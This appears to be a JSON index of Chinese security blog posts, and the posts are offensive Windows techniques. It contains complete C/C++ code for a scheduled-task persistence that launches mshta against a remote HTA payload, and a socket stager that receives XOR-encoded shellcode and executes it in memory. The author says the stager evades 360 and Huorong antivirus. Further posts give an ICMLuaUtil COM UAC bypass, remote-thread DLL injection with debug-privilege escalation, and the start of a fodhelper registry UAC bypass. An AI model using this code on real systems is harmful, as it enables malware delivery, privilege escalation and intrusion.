TASK_LOGON_INTERACTIVE_TOKEN, _variant_t(&quot;&quot;), &amp;pRegisteredTask); if (FAILED(hr)) { pTaskDefinition-&gt;Release(); return FALSE; } pTaskDefinition-&gt;Release(); pRegisteredTask-&gt;Release(); return TRUE;}//删除计划任务BOOL DeleteTask(char* lpszTaskName){ if (NULL == m_lpRootFolder) { return FALSE; } CComVariant variantTaskName(NULL); variantTaskName = lpszTaskName; HRESULT hr = m_lpRootFolder-&gt;DeleteTask(variantTaskName.bstrVal, 0); if (FAILED(hr)) { return FALSE; } return TRUE;}int main(){ const char* lpszTaskName = &quot;aaasacwss&quot;; //任务名 const char* lpszProgramPath = &quot;c:\\\\windows\\\\system32\\\\mshta.exe&quot;; //要执行的程序路径 const char* lpszParameters = &quot;http://192.168.111.129:8080/p7ptgsev.hta&quot;; //程序参数 const char* lpszAuthor = &quot;&quot;; Init(); BOOL bRet=CreateTask(lpszTaskName, lpszProgramPath, lpszParameters, lpszAuthor); if (!bRet) { printf(&quot;Create Task Failed&quot;); return -1; } UnInit(); printf(&quot;Successd&quot;); return 0;} 运行 添加成功 使用msf中的hta_server产生hta文件并传递payload，重启后返回一个Session","link":"/2021/02/28/%E4%BD%BF%E7%94%A8COM%E7%BB%84%E4%BB%B6%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/"},{"title":"利用SOCKET分离shellcode","text":"原理客户端运行后向服务端发起请求接收xor运算后的shellcode还原后执行，达到远程加载shellcode的目的，与stager的功能有些类似。 服务端代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109#include &lt;WinSock2.h&gt;#include &lt;iostream&gt;#pragma comment(lib, &quot;ws2_32.lib&quot;)using namespace std;int main(int argc, char* argv[]){ const int BUF_SIZE = 1024; WSADATA wsd; //WSADATA变量 SOCKET sServer; //服务器套接字 SOCKET sClient; //客户端套接字 SOCKADDR_IN addrServ;; //服务器地址 char buf[BUF_SIZE]; //接收数据缓冲区 char sendBuf[] = &quot;\\x6b\\xdf\\x14\\x73\\x67\\x7f\\x5f\\x97\\x97\\x97\\xd6\\xc6\\xd6\\xc7\\xc5\\xc6\\xc1\\xdf\\xa6\\x45\\xf2\\xdf\\x1c\\xc5\\xf7\\xdf\\x1c\\xc5\\x8f\\xdf\\x1c\\xc5\\xb7\\xdf\\x1c\\xe5\\xc7\\xdf\\x98\\x20\\xdd\\xdd\\xda\\xa6\\x5e\\xdf\\xa6\\x57\\x3b\\xab\\xf6\\xeb\\x95\\xbb\\xb7\\xd6\\x56\\x5e\\x9a\\xd6\\x96\\x56\\x75\\x7a\\xc5\\xd6\\xc6\\xdf\\x1c\\xc5\\xb7\\x1c\\xd5\\xab\\xdf\\x96\\x47\\xf1\\x16\\xef\\x8f\\x9c\\x95\\xe2\\xe5\\x1c\\x17\\x1f\\x97\\x97\\x97\\xdf\\x12\\x57\\xe3\\xf0\\xdf\\x96\\x47\\xc7\\x1c\\xdf\\x8f\\xd3\\x1c\\xd7\\xb7\\xde\\x96\\x47\\x74\\xc1\\xdf\\x68\\x5e\\xd6\\x1c\\xa3\\x1f\\xdf\\x96\\x41\\xda\\xa6\\x5e\\xdf\\xa6\\x57\\x3b\\xd6\\x56\\x5e\\x9a\\xd6\\x96\\x56\\xaf\\x77\\xe2\\x66\\xdb\\x94\\xdb\\xb3\\x9f\\xd2\\xae\\x46\\xe2\\x4f\\xcf\\xd3\\x1c\\xd7\\xb3\\xde\\x96\\x47\\xf1\\xd6\\x1c\\x9b\\xdf\\xd3\\x1c\\xd7\\x8b\\xde\\x96\\x47\\xd6\\x1c\\x93\\x1f\\xdf\\x96\\x47\\xd6\\xcf\\xd6\\xcf\\xc9\\xce\\xcd\\xd6\\xcf\\xd6\\xce\\xd6\\xcd\\xdf\\x14\\x7b\\xb7\\xd6\\xc5\\x68\\x77\\xcf\\xd6\\xce\\xcd\\xdf\\x1c\\x85\\x7e\\xd8\\x68\\x68\\x68\\xca\\xfd\\x97\\xde\\x29\\xe0\\xfe\\xf9\\xfe\\xf9\\xf2\\xe3\\x97\\xd6\\xc1\\xde\\x1e\\x71\\xdb\\x1e\\x66\\xd6\\x2d\\xdb\\xe0\\xb1\\x90\\x68\\x42\\xdf\\xa6\\x5e\\xdf\\xa6\\x45\\xda\\xa6\\x57\\xda\\xa6\\x5e\\xd6\\xc7\\xd6\\xc7\\xd6\\x2d\\xad\\xc1\\xee\\x30\\x68\\x42\\x7c\\xe4\\xcd\\xdf\\x1e\\x56\\xd6\\x2f\\xc7\\x97\\x97\\x97\\xda\\xa6\\x5e\\xd6\\xc6\\xd6\\xc6\\xfd\\x94\\xd6\\xc6\\xd6\\x2d\\xc0\\x1e\\x08\\x51\\x68\\x42\\x7c\\xce\\xcc\\xdf\\x1e\\x56\\xdf\\xa6\\x45\\xde\\x1e\\x4f\\xda\\xa6\\x5e\\xc5\\xff\\x97\\x95\\xd7\\x13\\xc5\\xc5\\xd6\\x2d\\x7c\\xc2\\xb9\\xac\\x68\\x42\\xdf\\x1e\\x51\\xdf\\x14\\x54\\xc7\\xfd\\x9d\\xc8\\xdf\\x1e\\x66\\xdf\\x1e\\x4d\\xde\\x50\\x57\\x68\\x68\\x68\\x68\\xda\\xa6\\x5e\\xc5\\xc5\\xd6\\x2d\\xba\\x91\\x8f\\xec\\x68\\x42\\x12\\x57\\x98\\x12\\x0a\\x96\\x97\\x97\\xdf\\x68\\x58\\x98\\x13\\x1b\\x96\\x97\\x97\\x7c\\x44\\x7e\\x73\\x96\\x97\\x97\\x7f\\x35\\x68\\x68\\x68\\xb8\\xff\\xd3\\xd9\\xf4\\x97\\x9b\\x88\\x75\\x09\\xbe\\x35\\xdc\\xd7\\x35\\x98\\xd0\\x2d\\xbe\\xa9\\x5b\\x83\\x00\\xa1\\xc6\\x5a\\xa4\\x4c\\xbd\\xd2\\x20\\xcc\\x66\\x45\\x97\\x24\\xda\\x15\\x40\\x32\\xe1\\xb7\\x8c\\xa2\\xfa\\xa2\\xa0\\x20\\x67\\x69\\x1c\\x02\\xe1\\x54\\x4e\\x8a\\x79\\x2c\\xf0\\xa7\\x4b\\x7d\\xd5\\xb9\\x3d\\xee\\x1a\\x4a\\xf5\\xa7\\x74\\x8d\\x66\\xed\\x9a\\x43\\xf5\\x3f\\x5a\\x97\\xc2\\xe4\\xf2\\xe5\\xba\\xd6\\xf0\\xf2\\xf9\\xe3\\xad\\xb7\\xda\\xf8\\xed\\xfe\\xfb\\xfb\\xf6\\xb8\\xa3\\xb9\\xa7\\xb7\\xbf\\xf4\\xf8\\xfa\\xe7\\xf6\\xe3\\xfe\\xf5\\xfb\\xf2\\xac\\xb7\\xda\\xc4\\xde\\xd2\\xb7\\xaf\\xb9\\xa7\\xac\\xb7\\xc0\\xfe\\xf9\\xf3\\xf8\\xe0\\xe4\\xb7\\xd9\\xc3\\xb7\\xa2\\xb9\\xa6\\xac\\xb7\\xc3\\xe5\\xfe\\xf3\\xf2\\xf9\\xe3\\xb8\\xa3\\xb9\\xa7\\xac\\xb7\\xb9\\xd9\\xd2\\xc3\\xb7\\xd4\\xdb\\xc5\\xb7\\xa6\\xb9\\xa6\\xb9\\xa3\\xa4\\xa5\\xa5\\xac\\xb7\\xd5\\xd8\\xde\\xd2\\xaf\\xac\\xd2\\xd9\\xc2\\xc4\\xbe\\x9a\\x9d\\x97\\xba\\x40\\x2a\\xb6\\xce\\x2c\\x01\\xae\\x0c\\x64\\x70\\x02\\xfb\\xbf\\x3b\\x14\\x9d\\x54\\xb9\\x76\\xe2\\x9c\\x2a\\x5d\\x28\\x08\\x2f\\xcd\\x21\\x52\\x5c\\x57\\xe0\\xfd\\x14\\x8a\\x95\\xaf\\x66\\xc1\\x23\\x70\\x97\\xe4\\xb2\\xd6\\xf7\\xd0\\x3a\\xf6\\xf7\\xcd\\x87\\x96\\xb2\\x0f\\xef\\x11\\x6b\\x1c\\x22\\x4d\\xc4\\xed\\x65\\xce\\x0a\\xab\\x30\\x94\\xd2\\xdc\\x8d\\xbf\\x3a\\xa6\\xc9\\xe0\\x5e\\x93\\x89\\x10\\x47\\xfa\\x96\\xac\\xb7\\x70\\xdd\\x93\\x41\\x7b\\x62\\x5d\\x35\\xe1\\x35\\x8b\\x4a\\x50\\x07\\x38\\x1f\\xb8\\x10\\x92\\xe0\\x08\\xcb\\xdb\\x79\\x8c\\xbe\\x94\\xcb\\xc0\\xb2\\x70\\x70\\xac\\x36\\xbd\\x83\\x76\\x46\\xde\\xfc\\x4a\\xac\\x0b\\x30\\x69\\x57\\x05\\x69\\xac\\x1f\\xec\\xba\\x09\\x8f\\x62\\xe8\\x4f\\xcd\\xe2\\x35\\x07\\xbe\\xab\\xaf\\x7c\\x64\\x8a\\x01\\xf5\\x92\\xe2\\x9c\\xda\\x28\\x7f\\xd5\\xc3\\x0d\\xa3\\x8f\\x8b\\x97\\x63\\x34\\xfa\\x7e\\xe9\\xd7\\x5e\\x5b\\x7b\\xb5\\xb3\\x47\\xa8\\xe3\\x8f\\x37\\xd0\\x2a\\x30\\xb1\\xc0\\x32\\xe8\\xd9\\x53\\x97\\xd6\\x29\\x67\\x22\\x35\\xc1\\x68\\x42\\xdf\\xa6\\x5e\\x2d\\x97\\x97\\xd7\\x97\\xd6\\x2f\\x97\\x87\\x97\\x97\\xd6\\x2e\\xd7\\x97\\x97\\x97\\xd6\\x2d\\xcf\\x33\\xc4\\x72\\x68\\x42\\xdf\\x04\\xc4\\xc4\\xdf\\x1e\\x70\\xdf\\x1e\\x66\\xdf\\x1e\\x4d\\xd6\\x2f\\x97\\xb7\\x97\\x97\\xde\\x1e\\x6e\\xd6\\x2d\\x85\\x01\\x1e\\x75\\x68\\x42\\xdf\\x14\\x53\\xb7\\x12\\x57\\xe3\\x21\\xf1\\x1c\\x90\\xdf\\x96\\x54\\x12\\x57\\xe2\\x40\\xcf\\xcf\\xcf\\xdf\\x92\\x97\\x97\\x97\\x97\\xc7\\x54\\x7f\\x08\\x6a\\x68\\x68\\xa6\\xae\\xa5\\xb9\\xa6\\xa1\\xaf\\xb9\\xa6\\xa6\\xa6\\xb9\\xa6\\xa4\\xa7\\x97\\x85\\xa3\\xc1\\xef&quot;; int retVal; //返回值 if (argc &lt;= 1) { cout &lt;&lt; &quot;USAGE: server.exe &lt;Listen Port&gt;&quot; &lt;&lt; endl; return -1; } if (WSAStartup(MAKEWORD(2, 2), &amp;wsd) != 0)//初始化套结字动态库 { cout &lt;&lt; &quot;WSAStartup failed!&quot; &lt;&lt; endl; return 1; } //创建套接字 sServer = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); if (INVALID_SOCKET == sServer) { cout &lt;&lt; &quot;Socket Failed!&quot; &lt;&lt; endl; WSACleanup();//释放套接字资源; return -1; } //服务器套接字地址 addrServ.sin_family = AF_INET; addrServ.sin_port = htons((short)atoi(argv[1]));; addrServ.sin_addr.s_addr = htonl(INADDR_ANY); //绑定套接字 retVal = bind(sServer, (LPSOCKADDR)&amp;addrServ, sizeof(SOCKADDR_IN)); if (SOCKET_ERROR == retVal) { cout &lt;&lt; &quot;Bind Failed!&quot; &lt;&lt; endl; closesocket(sServer); //关闭套接字 WSACleanup(); //释放套接字资源; return -1; } //开始监听 retVal = listen(sServer, 1); if (SOCKET_ERROR == retVal) { cout &lt;&lt; &quot;Listen Failed!&quot; &lt;&lt; endl; closesocket(sServer); //关闭套接字 WSACleanup(); //释放套接字资源; return -1; } cout &lt;&lt; &quot;开始监听中....&quot; &lt;&lt; endl; //接受客户端请求 sockaddr_in addrClient; int addrClientlen = sizeof(addrClient); sClient = accept(sServer, (sockaddr FAR*) &amp; addrClient, &amp;addrClientlen); // 生成对应当前客户端连接的套接字sClient if (INVALID_SOCKET == sClient) { cout &lt;&lt; &quot;Accept Failed!&quot; &lt;&lt; endl; closesocket(sServer); //关闭套接字 WSACleanup(); //释放套接字资源; return -1; } int flag = 1; //只接收一次 while (flag) { //接收客户端数据 ZeroMemory(buf, BUF_SIZE); // 填充为0 防止内存分配发生意外 retVal = recv(sClient, buf, BUF_SIZE, 0); // 接收数据放在buf缓冲区 if (SOCKET_ERROR == retVal) //判断是否接收错误 { cout &lt;&lt; &quot;Recv Failed!&quot; &lt;&lt; endl; closesocket(sServer); //关闭套接字 closesocket(sClient); //关闭套接字 WSACleanup(); //释放套接字资源; return -1; } if (buf[0] == '0') break; cout &lt;&lt; &quot;成功建立通信&quot; &lt;&lt; endl; send(sClient, sendBuf, sizeof(sendBuf), 0); cout &lt;&lt; &quot;向客户端发送shellcode...&quot; &lt;&lt; endl; cout &lt;&lt; &quot;发送shellcode成功!&quot; &lt;&lt; endl; flag = 0; } //退出 closesocket(sServer); //关闭套接字 closesocket(sClient); //关闭套接字 WSACleanup(); //释放套接字资源; return 0;} 客户端123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108#include &lt;stdio.h&gt;#include &lt;iostream&gt;#include &lt;WinSock2.h&gt;#pragma comment(lib, &quot;ws2_32.lib&quot;) //添加ws2_32动态库#pragma warning(disable:4996) //忽略旧函数使用的警告using namespace std;int main(int argc, char* argv[]){ const int BUF_SIZE = 1024; WSADATA wsd; //WSADATA变量 SOCKET sHost; // 服务器套接字socket SOCKADDR_IN servAddr; //服务器地址 char buf[BUF_SIZE]; // 存放发送的数据缓冲区 char bufRecv[BUF_SIZE]; //接收收到的数据缓冲区 DWORD dwThreadId; HANDLE hThread; DWORD dwOldProtect; int retVal; // 返回值 if (argc &lt;= 2) { cout &lt;&lt; &quot;USAGE: client.exe &lt;Server IP&gt; &lt;Server PORT&gt;&quot; &lt;&lt; endl; return -1; } if (WSAStartup(MAKEWORD(2, 2), &amp;wsd) != 0) //初始化套结字动态库 { cout &lt;&lt; &quot;WSAStartup failed!&quot; &lt;&lt; endl; return -1; } sHost = socket(AF_INET, SOCK_STREAM, 0); //创建套接字 IPV4 可靠的，双向的类型服务提供商选择 if (INVALID_SOCKET == sHost) { cout &lt;&lt; &quot;socket failed!&quot; &lt;&lt; endl; WSACleanup(); return -1; } //设置服务器的地址 servAddr.sin_family = AF_INET; //指定IPV4 servAddr.sin_addr.s_addr = inet_addr(argv[1]); // 指定服务器的地址 servAddr.sin_port = htons((short)atoi(argv[2])); // 指定服务器的端口 retVal = connect(sHost, (LPSOCKADDR)&amp;servAddr, sizeof(servAddr)); // 套接字 sockaddr的指针，也就是地址 第三个参数为SOCKADDR_IN结构体的大小 if (SOCKET_ERROR == retVal) //判断是否连接成功 { cout &lt;&lt; &quot;connect failed!&quot; &lt;&lt; endl; closesocket(sHost); WSACleanup(); return -1; } ZeroMemory(buf, BUF_SIZE); // buf指向的地址用0来填充 strcpy(buf, &quot;ok&quot;); //给ok两个字节的字符串复制给buf区段 retVal = send(sHost, buf, strlen(buf), 0); //send的返回值 if (SOCKET_ERROR == retVal) //判断是否发送成功 { cout &lt;&lt; &quot;send failed!&quot; &lt;&lt; endl; closesocket(sHost); WSACleanup(); return -1; } cout &lt;&lt; &quot;Starting Download Payload&quot; &lt;&lt; endl; ZeroMemory(bufRecv, BUF_SIZE); // bufRevc指向的地址用0来填充 Sleep(2000); //延迟两秒起到免杀绕过的效果 recv(sHost, bufRecv, BUF_SIZE, 0); //bufRecv缓冲区接收 服务端发送来的数据 Sleep(4000); closesocket(sHost); WSACleanup(); for (int i = 0; i &lt; sizeof(bufRecv); i++) { //采取倾旋的方式来进行异或解密 //Sleep(50); _InterlockedXor8(bufRecv + i, 0x97); } cout &lt;&lt; &quot;加载shellcode中&quot; &lt;&lt; endl; //下面就是开辟内存存储shellcode 创建线程进行执行 char* shellcode = (char*)VirtualAlloc( NULL, BUF_SIZE, MEM_COMMIT, PAGE_READWRITE // 只申请可读可写 ); CopyMemory(shellcode, bufRecv, BUF_SIZE); VirtualProtect(shellcode, BUF_SIZE, PAGE_EXECUTE, &amp;dwOldProtect); // VirtualProtect改变它的属性 -&gt; 可执行 hThread = CreateThread( NULL, // 安全描述符 NULL, // 栈的大小 (LPTHREAD_START_ROUTINE)shellcode, // 函数 NULL, // 参数 NULL, // 线程标志 &amp;dwThreadId // 线程ID ); WaitForSingleObject(hThread, INFINITE); return 0;} 在c2上运行服务端 在目标机器上执行客户端文件,联网情况下火绒和360不查杀 成功上线 参考：https://www.cnblogs.com/zpchcbd/p/12170851.html https://payloads.online/archivers/2019-11-10/5","link":"/2020/12/13/%E5%88%A9%E7%94%A8SOCKET%E5%88%86%E7%A6%BBshellcode/"},{"title":"基于COM组件接口的BypassUAC","text":"COM提升名称（COM Elevation Moniker）技术允许运行在用户账户控制下的应用程序用提升权限的方法来激活COM类，以此提升COM接口权限。其中，ICMLuaUtil接口提供了ShellExec方法执行命令，创建指定进程。 原理是利用COM提升名称以高权限调用ICMLuaUtil接口，从而以高权限执行ShellExec创建指定进程。使用权限提升COM类的程序必须通过调用CoCreateInstanceAsAdmin函数创建COM类，必须用可信程序运行，如果执行COM提升名称代码的程序身份不可信，则会触发UAC，要Bypass UAC必须让这一段代码在Windows的可信程序中运行，如记事本、计算器、rundll32.exe等，通过DLL注入或是劫持技术，将这段代码注入到这些可欣程序的进程空间中。通过rundll32.exe调用自定义DLL中的导出函数，执行COM提升名称的代码。 执行流程初始化com库-&gt;创建高权限的ICMLuaUtil接口-&gt;调用ICMLuaUtil的ShellExec方法-&gt;以高权限执行cmd 实质上是以高权限运行COM组件ICMLuaUtil,ICMLuaUtil中可调用ShellExecute执行程序。定义成导出函数，用可信程序rundll32调用导出函数 代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#include &quot;pch.h&quot;#include &quot;BypassUAC.h&quot;HRESULT CoCreateInstanceAsAdmin(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID* ppVoid){ BIND_OPTS3 bo; WCHAR wszCLSID[MAX_PATH] = { 0 }; WCHAR wszMonikerName[MAX_PATH] = { 0 }; HRESULT hr = 0; // 初始化COM环境 ::CoInitialize(NULL); // 构造字符串 ::StringFromGUID2(rclsid, wszCLSID, (sizeof(wszCLSID) / sizeof(wszCLSID[0]))); hr = ::StringCchPrintfW(wszMonikerName, (sizeof(wszMonikerName) / sizeof(wszMonikerName[0])), L&quot;Elevation:Administrator!new:%s&quot;, wszCLSID); if (FAILED(hr)) { return hr; } // 设置BIND_OPTS3 ::RtlZeroMemory(&amp;bo, sizeof(bo)); bo.cbStruct = sizeof(bo); bo.hwnd = hWnd; bo.dwClassContext = CLSCTX_LOCAL_SERVER; // 创建名称对象并获取COM对象 hr = ::CoGetObject(wszMonikerName, &amp;bo, riid, ppVoid); return hr;}BOOL CMLuaUtilBypassUAC(LPWSTR lpwszExecutable){ HRESULT hr = 0; CLSID clsidICMLuaUtil = { 0 }; IID iidICMLuaUtil = { 0 }; ICMLuaUtil* CMLuaUtil = NULL; BOOL bRet = FALSE; do { ::CLSIDFromString(CLSID_CMSTPLUA, &amp;clsidICMLuaUtil); ::IIDFromString(IID_ICMLuaUtil, &amp;iidICMLuaUtil); // 提权 hr = CoCreateInstanceAsAdmin(NULL, clsidICMLuaUtil, iidICMLuaUtil, (PVOID*)(&amp;CMLuaUtil)); if (FAILED(hr)) { break; } // 启动程序 hr = CMLuaUtil-&gt;lpVtbl-&gt;ShellExec(CMLuaUtil, lpwszExecutable, NULL, NULL, 0, SW_SHOW); if (FAILED(hr)) { break; } bRet = TRUE; } while (FALSE); // 释放 if (CMLuaUtil) { CMLuaUtil-&gt;lpVtbl-&gt;Release(CMLuaUtil); } return bRet;}//导出函数void CALLBACK BypassUAC(HWND hWnd, HINSTANCE hInstance, LPSTR lpszCmdLine, int iCmdShow){ CMLuaUtilBypassUAC((LPWSTR)L&quot;C:\\\\Windows\\\\System32\\\\cmd.exe&quot;);} 用lordpe查看生成dll的导出表，发现存在导出函数 用rundll32.exe调用导出函数 1rundll32 ComBypassUACdll.dll,BypassUAC BypassUAC成功 参考《Windows黑客编程技术详解》","link":"/2021/03/04/%E5%9F%BA%E4%BA%8ECOM%E7%BB%84%E4%BB%B6%E6%8E%A5%E5%8F%A3%E7%9A%84BypassUAC/"},{"title":"远程线程注入DLL","text":"原理在Windows操作系统中，每个进程的内存空间都是被隔离的，但是某些时候需要两个进程协调工作或者是跨进程操作。“远程线程”意思是跨进程，简单来说就是进程A在进程B中创建一个线程，这就叫远程线程。 DLL文件加载到进程的地址空间中，不会有进程名，隐蔽性较好，方法是强制让某进程加载DLL文件。只要有进程PID，先通过OpenProcess获取该进程句柄，再使用CreateRemoteThread。每个进程地址空间隔离，新创建的线程函数地址也应该在目的进程中，而不应该在本进程中，同样传递给线程函数的参数也应该在目的进程中，ThreadProc与LoadLibrary除了返回值以外基本相同，返回值的问题可以不考虑。直接把LoadLibrary函数作为线程函数创建到指定进程中。 LoadLibrary函数在Kernerl32.dll这个系统dll中，而Kernerl32这个DLL文件在任何进程中的加载位置都相同，也就是说LoadLibrary函数的地址在任何进程中的地址都相同，因此只要在进程中获取LoadLibray函数地址后，该地址在目标进程中也可以用。使用WriteProcessMemory把要注入的DLL文件写入目标进程，该函数第二个参数需要用VirtualAllocEx在目标进程申请一块内存，然后写入dll文件路径 实现过程原理：先获取进程句柄（OpenProcess）-&gt;在目标进程申请一块容纳dll文件路径名的内存（VirtualAllocEx）并写入dll路径名（WriteProcessMemory）-&gt;从Kernel32.dll中获取LoadLibraryA函数的地址(GetProcAddress函数)-&gt;在目标进程中创建一个线程（CreateRemoteThread），把线程函数地址(ThreadProc)替换为从Kernel32.dll中获取的LoadLibrary地址加载恶意dll 调整进程权限当前进程权限级别不够时，用OpenProcess()函数打开如smss.exe，winlogon.exe等系统进程时同样会失败，需要调整当前进程为”SeDebugPrivilege”权限。 调整权限3个步骤，调整权限使当前进程拥有”SeDebugPrivilege”权限，拥有这个权限后，当前进程可以访问一些受限的系统资源。 （1）使用OpenProcessToken函数打开当前进程的访问令牌 （2）使用LookupPrivilegeValue()函数取得描述权限的LUID （3）使用AdjustTokenPrivileges()函数调整访问令牌的权限。 调整权限代码 1234567891011121314151617181920212223242526bool AdjustProcessTokenPrivilege(){ LUID luidTmp; HANDLE hToken; TOKEN_PRIVILEGES tkp; if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken))//使用OpenProcessToken函数打开当前进程的访问令牌 return false; if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;luidTmp))//使用LookupPrivilegeValue()函数取得描述权限的LUID { CloseHandle(hToken); return FALSE; } tkp.PrivilegeCount = 1; tkp.Privileges[0].Luid = luidTmp; tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; if (!AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, sizeof(tkp), NULL, NULL))//使用AdjustTokenPrivileges()函数调整访问令牌的权限。 { CloseHandle(hToken); return FALSE; } return true;} 相关API函数OpenProcess有了进程ID后，用此函数获得进程句柄，返回值为进程的句柄，通过此句柄可结束进程 12345HANDLE OpenProcess( DWORD dwDesiredAccess,//进程想要取得的访问权限，PROCESS_ALL_ACCESS BOOL bInheritHandle,//获取的句柄是否可继承，一般FALSE DWORD dwProcessId//要打开的进程ID号); GetProcAddress成功返回导出函数或变量的地址,失败返回NULL 1234FARPROC GetProcAddress( HMODULE hModule,//LoadLibrary返回句柄 LPCSTR lpProcName//指定要获取函数地址的函数); CreateRemoteThread功能为创建远程线程，相比CreateThread多了一个hProcess参数，该参数指定要创建线程的进程句柄。CreateThread也是依赖于CreateRemoteThread，两个函数都必须传入线程函数参数（ThreadProc）。这里需要给lpStartAddress函数传入LoadLibraryA的地址替代原来调用的线程函数，LoadLibrary通过GetProcAddress函数从Kernel32.dll中获取。 123456789HANDLE CreateRemoteThread( HANDLE hProcess,//OpenProcess打开的线程句柄 LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress,//线程函数地址，传入LoadLibrary，该函数地址位于Kernel32.dll，每个进程中都固定，GetProcAddress获取 LPVOID lpParameter,//传给线程函数参数 DWORD dwCreationFlags, LPDWORD lpThreadId); VirtualAllocEx在目标进程申请一块内存,返回目标进程申请到的内存块的起始地址 1234567LPVOID VirtualAllocEx( HANDLE hProcess,//指定要申请内存的进程句柄 LPVOID lpAddress,//指定申请的起始位置 NULL SIZE_T dwSize,//指定申请内存的长度 填入申请内存大小，为dll路径的大小 DWORD flAllocationType,//指定申请内存的状态类型 DWORD flProtect//指定申请内存的内存属性); WriteProcessMemory把lpBuffer中的内容写到hProcess指定进程中的lpBaseAddress，使用WriteProcessMemory把要注入的DLL文件路径写入目标进程 1234567BOOL WriteProcessMemory( HANDLE hProcess,//指定进程的进程句柄 LPVOID lpBaseAddress,//指定写入内存的起始地址，先用virtualAllocex在目标进程中申请内存，然后写入dll文件路径 LPCVOID lpBuffer,//指定写入内容的缓冲区 SIZE_T nSize,//写入内容长度 SIZE_T *lpNumberOfBytesWritten//接收实际写入内容长度); CloseHandle对打开的句柄进行关闭释放资源 123BOOL CloseHandle( HANDLE hObject); 代码恶意dll代码，功能为弹出MessageBox 123456789101112131415161718192021222324// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;pch.h&quot;#include &lt;tchar.h&gt;BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ){ switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: MessageBox(NULL, _T(&quot;Dll Injected&quot;), _T(&quot;tips&quot;), MB_OK); case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE;} 注入代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104#include&lt;stdio.h&gt;#include&lt;windows.h&gt;#include&lt;stdlib.h&gt;#include&lt;Tlhelp32.h.&gt;#include&lt;tchar.h&gt;//提升权限代码BOOL AdjustProcessTokenPrivilege(){ LUID luidTmp; HANDLE hToken; TOKEN_PRIVILEGES tkp; if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken)) return false; if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;luidTmp)) { CloseHandle(hToken); return FALSE; } tkp.PrivilegeCount = 1; tkp.Privileges[0].Luid = luidTmp; tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; if (!AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, sizeof(tkp), NULL, NULL)) { CloseHandle(hToken); return FALSE; } return true;}BOOL LoadDll(DWORD dwProcessID, char* szDllPathName){ // #0.提升进程为DEBUG权限 if (!AdjustProcessTokenPrivilege()) { printf(&quot;提权失败\\n&quot;); return 0; } //获取进程句柄 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID); if (hProcess == NULL) { printf(&quot;OPENPROCESS Error ! \\n&quot;); return FALSE; } //在目标进程分配内存并写入dll路径名 LPVOID lpAllocAddr = VirtualAllocEx(hProcess, NULL, strlen(szDllPathName) + 1, MEM_COMMIT, PAGE_READWRITE); if (lpAllocAddr == NULL) { printf(&quot;VIRTUALALLOCEX Error ! \\n&quot;); GetLastError(); CloseHandle(hProcess); return FALSE; } BOOL bRet = WriteProcessMemory(hProcess, lpAllocAddr, szDllPathName, strlen(szDllPathName) + 1, NULL); if (!bRet) { printf(&quot;WriteProcessMemory Error ! \\n&quot;); GetLastError(); CloseHandle(hProcess); return FALSE; } //获取LoadLibraryA 函数地址 FARPROC dwLoadAddr = GetProcAddress(GetModuleHandle(_T(&quot;kernel32.dll&quot;)), &quot;LoadLibraryA&quot;); if (!dwLoadAddr) { printf(&quot;GetProcAddress Error !\\n&quot;); GetLastError(); CloseHandle(hProcess); return FALSE; } //创建远程线程,加载dll HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)dwLoadAddr, lpAllocAddr, 0, NULL); if (!hThread) { printf(&quot;CreatRemoteTread Error !\\n&quot;); GetLastError(); CloseHandle(hProcess); return FALSE; } CloseHandle(hProcess); return TRUE;}int main(){ LoadDll(25028, (char*)&quot;C:\\\\Users\\\\Administrator\\\\source\\\\repos\\\\Project8\\\\Project8\\\\DllTest.dll&quot;); return 0;} 选择PID为25028的进程进行注入 注入成功，弹出MessageBox","link":"/2021/02/02/%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5DLL/"},{"title":"注册表劫持BypassUAC","text":"原理一部分系统程序可以直接获取管理员权限而不触发UAC弹窗，这类程序被称为白名单程序。如fodhelper fodhelper.exe在启动过程查询注册表项 1HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command 该键值对存储可执行文件路径，普通用户对HKCU有编辑权限，可以写入想要执行的任意文件，如cmd.exe，写入后的文件会以最高权限执行 如果上一个键值对存在，继续查询 1HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command\\DelegateExecute 若也存在，则读取第一个注册内的值执行 当找不到HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command的时候才会去找HKCR\\ms-settings\\Classes\\ms-settings\\Shell\\Open\\command 默认情况下而HKCR\\ms-settings\\Classes\\ms-settings\\Shell\\Open\\command存在，而HKCU\\Software\\Classes\\ms-settings\\不存在，因此需要手动创建。 代码1.RegCreateKeyA创建HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\ 